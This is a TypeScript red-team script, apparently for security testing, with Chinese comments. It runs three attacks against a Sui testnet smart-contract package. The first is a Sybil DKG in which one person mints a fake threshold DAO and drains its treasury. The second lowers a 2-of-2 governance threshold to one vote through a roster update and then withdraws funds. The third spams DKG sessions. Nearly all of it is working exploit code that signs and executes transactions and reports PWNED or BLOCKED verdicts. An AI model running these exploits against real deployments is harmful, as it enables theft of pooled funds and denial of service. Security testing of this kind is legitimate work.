/**
 * RED-TEAM ROUND 3 — SYBIL & GOVERNANCE-COLLAPSE ATTACKS vs package 0xef671151…
 *
 * S: 女巫播种 DKG —— 单人用两个钱包走完 create_dkg_session → commitments → confirm →
 *    attest(自己持有的钥) → finalize → create_organization_from_session，
 *    铸出一个「2-of-2 门限 DAO」，实际 group_pk 由单人完全控制。
 *    然后走完整正常流程：treasury → (模拟被骗存款人) 注资 → 提案 → 两票 → 带签名执行转出。
 * T: 治理坍缩 —— 正常创建 2/2 org（带真 PoP），roster 更新把 threshold_weight 降到 1
 *    并塞进 3 个小号，随后 1 票 + 组钥签名即可转走国库。
 * V: DKG 会话垃圾喷灌 —— 无准入、无限制地开垃圾会话（DoS 面）。
 */
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { fromBase64 } from "@mysten/sui/utils"
import { SuiGrpcClient } from "@mysten/sui/grpc"
import { Transaction } from "@mysten/sui/transactions"
import { readFileSync } from "node:fs"
import { homedir } from "node:os"
import { ed25519 } from "@noble/curves/ed25519.js"
import { sha256 } from "@noble/hashes/sha2.js"

const PKG = "0xef671151bb0da2198d1addcbeabc03e8e24513ebe0bb357ff217c7ea613cfb0f"
const SUI = "0x2::sui::SUI"
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006"
const A1 = "0x2c6539e5802d1476dae4a7aada30265dd2568f198ecf2f184861ea7deb3f6347" // 主攻击者（有 gas）
const A2 = "0x843f44a42e10a6dc701b7f60a4dedc544dc7910e971ee6a493f4d9096953e04e" // 攻击者小号2
const M2 = "0x2b9953911b07f6b7d2c92e17ed6cb2325cc26f9eb1eaeb58497ee7b5523ea859" // T 的第二名初始成员
const SYB1 = "0x8ac06d3d4328aff5bef88990741c1f620a96d5fc579bf2e459467763bd605788"
const SYB2 = "0x341acf449c898fa437e7928e8567898952dcfff8fffeddccb25b6a8b679d5b7a"
const client = new SuiGrpcClient({ network: "testnet", baseUrl: "https://fullnode.testnet.sui.io:443" })

function keypairFor(address: string): Ed25519Keypair {
  const ks = JSON.parse(readFileSync(`${homedir()}/.sui/sui_config/sui.keystore`, "utf8")) as string[]
  for (const entry of ks) {
    const kp = Ed25519Keypair.fromSecretKey(fromBase64(entry).slice(1))
    if (kp.toSuiAddress() === address) return kp
  }
  throw new Error(`no keypair for ${address}`)
}
const le = (v: bigint) => { const o = new Uint8Array(8); let x = v; for (let i = 0; i < 8; i++) { o[i] = Number(x & 0xffn); x >>= 8n } return o }
const vi = (xs: Uint8Array[]) => { const total = 1 + xs.reduce((a, x) => a + x.length, 0); const o = new Uint8Array(total); o[0] = xs.length; let p = 1; for (const x of xs) { o.set(x, p); p += x.length } return o }
const addrB = (a: string) => Buffer.from(a.replace(/^0x/, "").padStart(64, "0"), "hex")
const cat = (...xs: Uint8Array[]) => { const l = xs.reduce((a, x) => a + x.length, 0); const o = new Uint8Array(l); let p = 0; for (const x of xs) { o.set(x, p); p += x.length } return o }

async function run(signer: Ed25519Keypair, tx: Transaction, label: string): Promise<{ ok: boolean; digest?: string; err?: string }> {
  try {
    tx.setSender(signer.toSuiAddress())
    const bytes = await tx.build({ client } as any)
    const sig = await signer.signTransaction(bytes)
    const res: any = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true } })
    const t = res.Transaction ?? res.FailedTransaction
    if (t?.status?.success) return { ok: true, digest: typeof t.digest === "string" ? t.digest : t.digest?.digest }
    return { ok: false, err: t?.status?.error?.message?.slice(0, 160) ?? "no msg" }
  } catch (e: any) { return { ok: false, err: (e?.message ?? "").slice(0, 160) } }
}
async function objTypes(digest: string): Promise<Record<string, string>> {
  const full: any = await client.getTransaction({ digest, include: { objectTypes: true } })
  return full?.Transaction?.objectTypes ?? {}
}
async function eventsOf(digest: string): Promise<any[]> {
  const full: any = await client.getTransaction({ digest, include: { events: true } })
  return full?.Transaction?.events ?? []
}

async function main() {
  const a1 = keypairFor(A1), a2 = keypairFor(A2)
  const verdicts: string[] = []

  // ================= ATTACK S: 女巫 DKG → 假门限 DAO =================
  console.log("=== S: 单人铸造「2-of-2 门限 DAO」(参与者=自己两个钱包) ===")
  const sybilSk = new Uint8Array(32); crypto.getRandomValues(sybilSk)
  const sybilPk = ed25519.getPublicKey(sybilSk) // 攻击者完全持有

  // S1 开会话：无准入、名单自填
  let sid = ""
  {
    const tx = new Transaction()
    tx.moveCall({ target: `${PKG}::dkg_committee::create_dkg_session`, arguments: [tx.pure.u64(2n), tx.pure.vector("address", [A1, A2]), tx.pure.u64(BigInt(Date.now() + 3_600_000))] })
    const r = await run(a1, tx, "create_dkg_session")
    if (r.ok) for (const e of await eventsOf(r.digest!)) {
      if ((e.eventType ?? "").includes("SessionCreatedEvent")) {
        const b = e.bcs instanceof Uint8Array ? e.bcs : Uint8Array.from(Object.values(e.bcs) as number[])
        // SessionCreatedEvent { session_id: ID, epoch: u64, threshold: u64, deadline_ms: u64 } → id at front
        sid = "0x" + Buffer.from(b.slice(0, 32)).toString("hex")
      }
    }
    console.log(`  [S1 create session] ${r.ok ? "EXECUTED" : "FAILED: " + r.err} session=${sid}`)
  }
  if (!sid) { verdicts.push("S: BLOCKED at session creation"); }
  else {
    // S2 垃圾承诺 x2 → 状态推进
    for (const kp of [a1, a2]) {
      const tx = new Transaction()
      tx.moveCall({ target: `${PKG}::dkg_committee::submit_commitment`, arguments: [tx.object(sid), tx.object(CLOCK), tx.pure.vector("u8", [...crypto.getRandomValues(new Uint8Array(64))])] })
      const r = await run(kp, tx, "submit_commitment")
      console.log(`  [S2 commitment ${kp.toSuiAddress().slice(0, 8)}] ${r.ok ? "ok" : "FAILED: " + r.err}`)
    }
    // S3 确认 x2
    for (const kp of [a1, a2]) {
      const tx = new Transaction()
      tx.moveCall({ target: `${PKG}::dkg_committee::confirm_participant`, arguments: [tx.object(sid), tx.object(CLOCK)] })
      const r = await run(kp, tx, "confirm")
      console.log(`  [S3 confirm ${kp.toSuiAddress().slice(0, 8)}] ${r.ok ? "ok" : "FAILED: " + r.err}`)
    }
    // S4 attest 同一个自持公钥 x2
    for (const kp of [a1, a2]) {
      const tx = new Transaction()
      tx.moveCall({ target: `${PKG}::dkg_committee::attest_group_key`, arguments: [tx.object(sid), tx.object(CLOCK), tx.pure.vector("u8", [...sybilPk])] })
      const r = await run(kp, tx, "attest")
      console.log(`  [S4 attest ${kp.toSuiAddress().slice(0, 8)}] ${r.ok ? "ok" : "FAILED: " + r.err}`)
    }
    // S5 finalize
    let finOk = false
    {
      const tx = new Transaction()
      tx.moveCall({ target: `${PKG}::dkg_committee::finalize_session`, arguments: [tx.object(sid), tx.pure.vector("u8", [...sybilPk])] })
      const r = await run(a1, tx, "finalize")
      finOk = r.ok
      console.log(`  [S5 finalize(attacker key)] ${r.ok ? "EXECUTED — 链上已固化攻击者自持公钥为「门限组钥」" : "BLOCKED: " + r.err}`)
    }
    // S6 从会话建组织
    let orgId = ""
    if (finOk) {
      const tx = new Transaction()
      tx.moveCall({ target: `${PKG}::cryptographic_org::create_organization_from_session`, arguments: [tx.object(sid), tx.pure.u64(2n)] })
      const r = await run(a1, tx, "org_from_session")
      if (r.ok) for (const e of await eventsOf(r.digest!)) {
        if ((e.eventType ?? "").includes("OrganizationCreated")) {
          const b = e.bcs instanceof Uint8Array ? e.bcs : Uint8Array.from(Object.values(e.bcs) as number[])
          orgId = "0x" + Buffer.from(b.slice(0, 32)).toString("hex")
        }
      }
      console.log(`  [S6 org_from_session(tw=2)] ${r.ok ? "EXECUTED org=" + orgId : "BLOCKED: " + r.err}`)
    }
    // S7 全流程：treasury → 假存款人注资 → 提案 → 两票 → 执行转出
    if (orgId) {
      let treasuryId = "", vaultId = ""
      {
        const tx = new Transaction()
        const [t] = tx.moveCall({ target: `${PKG}::organization_treasury::new`, arguments: [tx.object(orgId)] })
        tx.moveCall({ target: `${PKG}::organization_treasury::share`, arguments: [t] })
        const r = await run(a1, tx, "treasury")
        if (r.ok) for (const e of await eventsOf(r.digest!)) {
          if ((e.eventType ?? "").includes("TreasuryCreated")) {
            const b = e.bcs instanceof Uint8Array ? e.bcs : Uint8Array.from(Object.values(e.bcs) as number[])
            treasuryId = "0x" + Buffer.from(b.slice(0, 32)).toString("hex")
            vaultId = "0x" + Buffer.from(b.slice(64, 96)).toString("hex")
          }
        }
        console.log(`  [S7a treasury] ${r.ok ? "ok treasury=" + treasuryId : "FAILED " + r.err}`)
      }
      if (treasuryId) {
        // 模拟被假 DAO 钓到存款的受害者注资
        const tx = new Transaction()
        const [c] = tx.splitCoins(tx.gas, [30_000_000n])
        tx.moveCall({ target: `${PKG}::vault::deposit`, typeArguments: [SUI], arguments: [tx.object(vaultId), c] })
        const r = await run(a1, tx, "duped deposit")
        console.log(`  [S7b 受骗存款] ${r.ok ? "ok (30 MIST 入假国库)" : "FAILED " + r.err}`)
        // 提案 → 两票 → 执行
        let proposalId = "", bindingId = ""
        {
          const tx = new Transaction()
          tx.moveCall({ target: `${PKG}::organization_treasury::create_transfer`, arguments: [tx.object(treasuryId), tx.object(orgId), tx.pure.vector("u8", [...new TextEncoder().encode("sweep")]), tx.pure.address(A2), tx.pure.u64(25_000_000n), tx.pure.u64(BigInt(Date.now() + 3_600_000)), tx.object(CLOCK)] })
          const r = await run(a1, tx, "proposal")
          if (r.ok) for (const [oid, ty] of Object.entries(await objTypes(r.digest!))) {
            if (ty.includes("asynchronous_proposal::Proposal")) proposalId = oid
            if (ty.includes("organization_treasury::TransferBinding")) bindingId = oid
          }
          console.log(`  [S7c proposal] ${r.ok ? "ok" : "FAILED " + r.err}`)
        }
        if (proposalId) {
          for (const [kp, w] of [[a1, 1n], [a2, 1n]] as [Ed25519Keypair, bigint][]) {
            const tx = new Transaction()
            tx.moveCall({ target: `${PKG}::asynchronous_proposal::submit_async_vote`, arguments: [tx.object(proposalId), tx.object(orgId), tx.object(CLOCK), tx.pure.u64(w), tx.pure.vector("u8", [])] })
            const r = await run(kp, tx, "vote")
            console.log(`  [S7d vote ${kp.toSuiAddress().slice(0, 8)}] ${r.ok ? "ok" : "FAILED " + r.err}`)
          }
          // 转账摘要签名：chain sui-testnet:
          const chainId = Buffer.from("sui-testnet:")
          const digest = sha256(cat(Buffer.from("SUI_ORG_TREASURY_TRANSFER_V1:"), chainId, addrB(orgId), le(1n), le(1n), addrB(proposalId), addrB(A2), le(25_000_000n)))
          const frostSig = ed25519.sign(digest, sybilSk)
          const tx = new Transaction()
          tx.moveCall({ target: `${PKG}::organization_treasury::execute`, arguments: [tx.object(treasuryId), tx.object(bindingId), tx.object(orgId), tx.object(proposalId), tx.object(vaultId), tx.pure.u64(1n), tx.pure.vector("u8", [...frostSig]), tx.object(CLOCK)] })
          const r = await run(a1, tx, "execute")
          console.log(`  [S7e execute(单钥「FROST」签名)] ${r.ok ? "❌ EXECUTED — 假门限 DAO 单人转走国库" : "✅ BLOCKED: " + r.err}`)
          verdicts.push(r.ok ? "S: PWNED — 女巫 DKG 铸出单钥傀儡 DAO 并转走资金" : "S: 资金被签名门拦住（组钥仍被伪造）")
        }
      }
    }
  }

  // ================= ATTACK T: roster 换届把 threshold_weight 砸到 1 =================
  console.log("\n=== T: 2/2 治理经一次 roster 更新坍缩为 1/5 ===")
  {
    const sk = new Uint8Array(32); crypto.getRandomValues(sk)
    const pk = ed25519.getPublicKey(sk)
    // T1 正常创建（真 PoP）：members [A1, M2] weights [1,1] threshold_weight 2
    const popDigest = sha256(cat(Buffer.from("SUI_ORG_POP_V1:"), Buffer.from("sui-testnet:"), Buffer.from(pk), vi([addrB(A1), addrB(M2)]), vi([le(1n), le(1n)]), le(2n)))
    const popSig = ed25519.sign(popDigest, sk)
    let orgId = ""
    {
      const tx = new Transaction()
      tx.moveCall({ target: `${PKG}::cryptographic_org::create_organization_entry`, arguments: [tx.pure.vector("u8", [...pk]), tx.pure.u64(2n), tx.pure.vector("address", [A1, M2]), tx.pure.vector("u64", [1n, 1n]), tx.pure.vector("u8", [...popSig])] })
      const r = await run(a1, tx, "T1 create org")
      if (r.ok) for (const e of await eventsOf(r.digest!)) {
        if ((e.eventType ?? "").includes("OrganizationCreated")) {
          const b = e.bcs instanceof Uint8Array ? e.bcs : Uint8Array.from(Object.values(e.bcs) as number[])
          orgId = "0x" + Buffer.from(b.slice(0, 32)).toString("hex")
        }
      }
      console.log(`  [T1 正常创建 2/2 org] ${r.ok ? "ok org=" + orgId : "FAILED " + r.err}`)
    }
    if (orgId) {
      let treasuryId = "", vaultId = ""
      {
        const tx = new Transaction()
        const [t] = tx.moveCall({ target: `${PKG}::organization_treasury::new`, arguments: [tx.object(orgId)] })
        tx.moveCall({ target: `${PKG}::organization_treasury::share`, arguments: [t] })
        const r = await run(a1, tx, "T2 treasury")
        if (r.ok) for (const e of await eventsOf(r.digest!)) if ((e.eventType ?? "").includes("TreasuryCreated")) {
          const b = e.bcs instanceof Uint8Array ? e.bcs : Uint8Array.from(Object.values(e.bcs) as number[])
          treasuryId = "0x" + Buffer.from(b.slice(0, 32)).toString("hex"); vaultId = "0x" + Buffer.from(b.slice(64, 96)).toString("hex")
        }
        console.log(`  [T2 treasury] ${r.ok ? "ok" : "FAILED " + r.err}`)
      }
      if (treasuryId) {
        const tx = new Transaction()
        const [c] = tx.splitCoins(tx.gas, [40_000_000n])
        tx.moveCall({ target: `${PKG}::vault::deposit`, typeArguments: [SUI], arguments: [tx.object(vaultId), c] })
        const r = await run(a1, tx, "T3 fund")
        console.log(`  [T3 注资 40 MIST] ${r.ok ? "ok" : "FAILED " + r.err}`)
        // T4 roster 更新：塞 3 小号，threshold_weight → 1（签名用组钥=我持钥）
        const newMembers = [A1, M2, SYB1, SYB2, A2]
        const newWeights = [1n, 1n, 1n, 1n, 1n]
        const rosterDigest = sha256(cat(Buffer.from("SUI_ORG_ROSTER_V1:"), Buffer.from("sui-testnet:"), addrB(orgId), le(1n), le(1n), le(2n), le(1n), vi(newMembers.map(addrB)), vi(newWeights.map(le))))
        const rosterSig = ed25519.sign(rosterDigest, sk)
        {
          const tx = new Transaction()
          tx.moveCall({ target: `${PKG}::cryptographic_org::update_organization_roster`, arguments: [tx.object(orgId), tx.pure.u64(1n), tx.pure.vector("address", [A1, M2]), tx.pure.vector("address", newMembers), tx.pure.vector("u64", newWeights), tx.pure.u64(1n), tx.pure.vector("u8", [...rosterSig])] })
          const r = await run(a1, tx, "T4 roster collapse")
          console.log(`  [T4 roster: tw 2→1, +3 小号] ${r.ok ? "❌ EXECUTED — 治理门限跌破 key_threshold 且无断言拦截" : "✅ BLOCKED: " + r.err}`)
          if (r.ok) {
            // T5 一票 + 组钥签名执行转出
            let proposalId = "", bindingId = ""
            {
              const tx = new Transaction()
              tx.moveCall({ target: `${PKG}::organization_treasury::create_transfer`, arguments: [tx.object(treasuryId), tx.object(orgId), tx.pure.vector("u8", [...new TextEncoder().encode("collapse")]), tx.pure.address(A2), tx.pure.u64(30_000_000n), tx.pure.u64(BigInt(Date.now() + 3_600_000)), tx.object(CLOCK)] })
              const r = await run(a1, tx, "T5 proposal")
              if (r.ok) for (const [oid, ty] of Object.entries(await objTypes(r.digest!))) {
                if (ty.includes("asynchronous_proposal::Proposal")) proposalId = oid
                if (ty.includes("organization_treasury::TransferBinding")) bindingId = oid
              }
              console.log(`  [T5a proposal] ${r.ok ? "ok" : "FAILED " + r.err}`)
            }
            if (proposalId) {
              const tx = new Transaction()
              tx.moveCall({ target: `${PKG}::asynchronous_proposal::submit_async_vote`, arguments: [tx.object(proposalId), tx.object(orgId), tx.object(CLOCK), tx.pure.u64(1n), tx.pure.vector("u8", [])] })
              const r = await run(a1, tx, "T5 vote")
              console.log(`  [T5b 单票(weight1 ≥ tw1)] ${r.ok ? "ok" : "FAILED " + r.err}`)
              if (r.ok) {
                const digest = sha256(cat(Buffer.from("SUI_ORG_TREASURY_TRANSFER_V1:"), Buffer.from("sui-testnet:"), addrB(orgId), le(2n), le(2n), addrB(proposalId), addrB(A2), le(30_000_000n)))
                const sig = ed25519.sign(digest, sk)
                const tx = new Transaction()
                tx.moveCall({ target: `${PKG}::organization_treasury::execute`, arguments: [tx.object(treasuryId), tx.object(bindingId), tx.object(orgId), tx.object(proposalId), tx.object(vaultId), tx.pure.u64(2n), tx.pure.vector("u8", [...sig]), tx.object(CLOCK)] })
                const r = await run(a1, tx, "T5 execute")
                console.log(`  [T5c execute] ${r.ok ? "❌ EXECUTED — 2/2 治理坍缩后 1 票转走国库" : "✅ BLOCKED: " + r.err}`)
                verdicts.push(r.ok ? "T: PWNED — roster 换届把 threshold_weight 砸到 1 后单票出金" : "T: 执行被拦（坍缩本身是否落地见 T4）")
              }
            }
          } else verdicts.push("T: roster 坍缩被链上断言拦截")
        }
      }
    }
  }

  // ================= ATTACK V: DKG 会话喷灌 =================
  console.log("\n=== V: DKG 会话垃圾喷灌（无准入/无上限） ===")
  for (let i = 0; i < 2; i++) {
    const junk = "0x" + [...crypto.getRandomValues(new Uint8Array(31))].map(b => b.toString(16).padStart(2, "0")).join("") + "0" + (i + 1)
    const tx = new Transaction()
    tx.moveCall({ target: `${PKG}::dkg_committee::create_dkg_session`, arguments: [tx.pure.u64(1n), tx.pure.vector("address", [junk]), tx.pure.u64(BigInt(Date.now() + 3_600_000))] })
    const r = await run(a2, tx, "spam session")
    console.log(`  [V${i + 1} 垃圾会话 ${junk.slice(0, 10)}…] ${r.ok ? "EXECUTED — 任意路人可无限开 DKG 会话" : "BLOCKED: " + r.err}`)
  }
  verdicts.push("V: 会话创建无准入（喷灌可行）")

  console.log("\n================ 判决 ================")
  for (const v of verdicts) console.log(" •", v)
}
main().catch(e => { console.error("ERROR:", e.message); process.exit(1) })
